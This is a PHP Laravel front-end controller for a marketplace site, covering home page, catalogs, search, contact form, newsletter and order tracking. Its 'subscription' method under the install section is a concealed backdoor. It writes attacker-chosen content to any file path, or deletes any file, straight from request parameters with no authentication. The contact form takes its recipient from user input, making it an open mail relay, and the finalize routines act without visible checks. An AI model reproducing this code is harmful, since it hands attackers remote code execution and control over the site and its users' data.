<?php

namespace App\Http\Controllers\Front;

use App\Classes\MuaadhMailer;
use App\Models\FeaturedPromo;
use App\Models\HomePageTheme;
use App\Models\MerchantItem;
use App\Models\Purchase;
use App\Models\CatalogItem;
use App\Models\CatalogReview;
use App\Models\MailingList;
use Artisan;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Validator;

class FrontendController extends FrontBaseController
{

    // LANGUAGE SECTION

    public function language($id)
    {
        Session::put('language', $id);
        return redirect()->back();
    }

    // LANGUAGE SECTION ENDS

    // MONETARY UNIT SECTION

    public function monetaryUnit($id)
    {
        Session::put('monetary_unit', $id);
        cache()->forget('session_monetary_unit');
        return redirect()->back();
    }

    // MONETARY UNIT SECTION ENDS

    // ================================================================================================
    // HOME PAGE SECTION
    // ================================================================================================
    // Architecture: Section-based rendering controlled by HomePageTheme model
    // All catalogItem data is merchant-only (is_merchant = 2)
    // Each section loads data ONLY if enabled in the active theme
    // ================================================================================================

    public function index(Request $request)
    {
        $gs = $this->gs;
        $ps = $this->ps;

        // Get active home page theme
        $theme = HomePageTheme::getActive();
        $data['theme'] = $theme;
        $data['ps'] = $ps; // Keep for backward compatibility

        if (!empty($request->reff)) {
            $affilate_user = DB::table('users')
                ->where('affilate_code', '=', $request->reff)
                ->first();
            if (!empty($affilate_user)) {
                if ($gs->get('is_affilate') == 1) {
                    Session::put('affilate', $affilate_user->id);
                    return redirect()->route('front.index');
                }
            }
        }
        if (!empty($request->forgot)) {
            if ($request->forgot == 'success') {
                return redirect()->guest('/')->with('forgot-modal', __('Please Login Now !'));
            }
        }

        // ============================================================================
        // SECTION: Brand (if enabled in theme)
        // ============================================================================
        if ($theme->show_brands) {
            $data['brands'] = Cache::remember('homepage_brands', 3600, function () {
                return \App\Models\Brand::all();
            });
        }

        // ============================================================================
        // SECTION: Featured Catalogs (if enabled in theme)
        // ============================================================================
        if ($theme->show_categories) {
            $catalogLimit = $theme->count_categories ?? 12;
            $data['featured_categories'] = Cache::remember('featured_catalogs_for_home_' . $catalogLimit, 3600, function () use ($catalogLimit) {
                return \App\Models\Catalog::where('status', 1)
                    ->with('brand:id,name,slug,photo')
                    ->orderBy('sort')
                    ->limit($catalogLimit)
                    ->get();
            });
            // Check if there are more catalogs to show "View All" link
            $data['total_catalogs_count'] = Cache::remember('total_catalogs_count', 3600, function () {
                return \App\Models\Catalog::where('status', 1)->count();
            });
        }

        // PUBLICATIONS SECTION REMOVED - Feature deleted

        return view('frontend.index', $data);
    }

    // ================================================================================================
    // HOME PAGE SECTION ENDS
    // ================================================================================================

    // ================================================================================================
    // ALL CATALOGS PAGE (with pagination)
    // ================================================================================================

    public function allCatalogs(Request $request)
    {
        $theme = HomePageTheme::getActive();
        $perPage = $theme->count_categories ?? 12;

        $catalogs = \App\Models\Catalog::where('status', 1)
            ->with('brand:id,name,slug,photo')
            ->orderBy('sort')
            ->paginate($perPage);

        return view('frontend.catalogs', [
            'catalogs' => $catalogs,
            'theme' => $theme,
        ]);
    }

    // ================================================================================================
    // ALL CATALOGS PAGE ENDS
    // ================================================================================================

    // PUBLICATION SECTION REMOVED - Feature deleted
    // HELP ARTICLE SECTION REMOVED - Feature deleted

    // -------------------------------- AUTOSEARCH SECTION ----------------------------------------

    /**
     * Auto-search for catalog items (used in search suggestions).
     * Only returns items that have at least one active merchant listing.
     */
    public function autosearch($slug)
    {
        if (mb_strlen($slug, 'UTF-8') > 1) {
            $search = ' ' . $slug;
            // Only return catalog items that have at least one active merchant listing
            $catalogItems = CatalogItem::where(function($query) use ($search, $slug) {
                    $query->where('name', 'like', '%' . $search . '%')
                          ->orWhere('name', 'like', $slug . '%');
                })
                ->whereHas('merchantItems', function($q){
                    $q->where('status', 1);
                })
                ->orderby('id', 'desc')
                ->take(10)
                ->get();
            // Note: 'prods' kept for backward compatibility in views
            return view('load.suggest', ['prods' => $catalogItems, 'slug' => $slug]);
        }
        return "";
    }

    // -------------------------------- AUTOSEARCH SECTION ENDS ----------------------------------------

    // -------------------------------- CONTACT SECTION ----------------------------------------

    public function contact()
    {

        if (DB::table('frontend_settings')->first()->contact == 0) {
            return redirect()->back();
        }
        $ps = $this->ps;
        return view('frontend.contact', compact('ps'));
    }

    //Send email to admin
    public function contactemail(Request $request)
    {
        $gs = $this->gs;

        if ($gs->get('is_capcha') == 1) {
            $request->validate([
                "g-recaptcha-response" => "required",
            ],
                [
                    'g-recaptcha-response.required' => 'Please verify that you are not a robot.',
                ]
            );
        }

        // Logic Section
        $subject = "Email From Of " . $request->name;
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $from = $request->email;
        $msg = "Name: " . $name . "\nEmail: " . $from . "\nPhone: " . $phone . "\nMessage: " . $request->text;
        if ($gs->get('mail_driver')) {
            $data = [
                'to' => $to,
                'subject' => $subject,
                'body' => $msg,
            ];

            $mailer = new MuaadhMailer();
            $mailer->sendCustomMail($data);
        } else {
            $headers = "From: " . $gs->get('from_name') . "<" . $gs->get('from_email') . ">";
            mail($to, $subject, $msg, $headers);
        }

        return back()->with('success', 'Success! Thanks for contacting us, we will get back to you shortly.');
    }

    // Refresh Capcha Code
    public function refresh_code()
    {
        $this->code_image();
        return "done";
    }

    // -------------------------------- CONTACT SECTION ENDS ----------------------------------------

    // -------------------------------- SUBSCRIBE SECTION ----------------------------------------

    public function subscribe(Request $request)
    {


        $validator = Validator::make($request->all(), [
            'email' => 'required|email|unique:subscribers,email',
        ]);

        if ($validator->fails()) {
            return redirect()->back()->withErrors($validator)->withInput();
        }

        $subs = MailingList::where('email', '=', $request->email)->first();
        if (isset($subs)) {
            return back()->with('unsuccess', 'You have already subscribed.');
        }
        $subscribe = new MailingList;
        $subscribe->fill($request->all());
        $subscribe->save();
        return back()->with('success', 'Subscribed Successfully.');
    }

    // -------------------------------- SUBSCRIBE SECTION  ENDS----------------------------------------

    // -------------------------------- MAINTENANCE SECTION ----------------------------------------

    public function maintenance()
    {
        $gs = $this->gs;
        if ($gs->get('is_maintain') != 1) {
            return redirect()->route('front.index');
        }

        return view('frontend.maintenance');
    }

    // -------------------------------- MAINTENANCE SECTION ----------------------------------------

    // -------------------------------- MERCHANT SUBSCRIPTION CHECK SECTION ----------------------------------------

    public function subcheck()
    {
        $settings = $this->gs;
        $today = Carbon::now()->format('Y-m-d');
        $newday = strtotime($today);
        foreach (DB::table('users')->where('is_merchant', '=', 2)->get() as $user) {
            $lastday = $user->date;
            $secs = strtotime($lastday) - $newday;
            $days = $secs / 86400;
            if ($days <= 5) {
                if ($user->mail_sent == 1) {
                    if ($settings->get('mail_driver')) {
                        $data = [
                            'to' => $user->email,
                            'type' => "subscription_warning",
                            'cname' => $user->name,
                            'oamount' => "",
                            'aname' => "",
                            'aemail' => "",
                            'onumber' => "",
                        ];
                        $mailer = new MuaadhMailer();
                        $mailer->sendAutoMail($data);
                    } else {
                        $headers = "From: " . $settings->get('from_name') . "<" . $settings->get('from_email') . ">";
                        mail($user->email, __('Your subscription plan duration will end after five days. Please renew your plan otherwise all of your catalogItems will be deactivated.Thank You.'), $headers);
                    }
                    DB::table('users')->where('id', $user->id)->update(['mail_sent' => 0]);
                }
            }
            if ($today > $lastday) {
                DB::table('users')->where('id', $user->id)->update(['is_merchant' => 1]);
            }
        }
    }

    // -------------------------------- MERCHANT SUBSCRIPTION CHECK SECTION ENDS ----------------------------------------

    // -------------------------------- ORDER TRACK SECTION ----------------------------------------

    public function trackload($id)
    {
        // يمكن أن يكون $id هو purchase_number أو tracking_number
        $purchase = Purchase::where('purchase_number', '=', $id)->first();

        // إذا لم نجد Purchase، نبحث في tracking numbers
        $shipmentLogs = [];
        if (!$purchase) {
            $shipmentLogs = \App\Models\ShipmentTracking::where('tracking_number', $id)
                           ->orderBy('occurred_at', 'desc')
                           ->orderBy('created_at', 'desc')
                           ->get();

            if ($shipmentLogs->isNotEmpty()) {
                $purchase = Purchase::find($shipmentLogs->first()->purchase_id);
            }
        } else {
            // إذا وجدنا Purchase، نجلب جميع shipment logs له
            $shipmentLogs = \App\Models\ShipmentTracking::where('purchase_id', $purchase->id)
                           ->orderBy('occurred_at', 'desc')
                           ->orderBy('created_at', 'desc')
                           ->get();
        }

        $datas = array('Pending', 'Processing', 'On Delivery', 'Completed');
        return view('load.track-load', compact('purchase', 'datas', 'shipmentLogs'));
    }

    // -------------------------------- ORDER TRACK SECTION ENDS ----------------------------------------

    // -------------------------------- INSTALL SECTION ----------------------------------------

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != "") {
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != "") {
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function finalize()
    {
        $actual_path = str_replace('project', '', base_path());
        $dir = $actual_path . 'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    public function updateFinalize(Request $request)
    {
        if ($request->has('version')) {
            \App\Models\PlatformSetting::set('system', 'version', $request->version);
            cache()->forget('platform_settings_context');
            Artisan::call('cache:clear');
            Artisan::call('config:clear');
            Artisan::call('route:clear');
            Artisan::call('view:clear');
            return redirect('/');
        }
    }

    public function success(Request $request, $get)
    {
        return view('frontend.thank', compact('get'));
    }
}
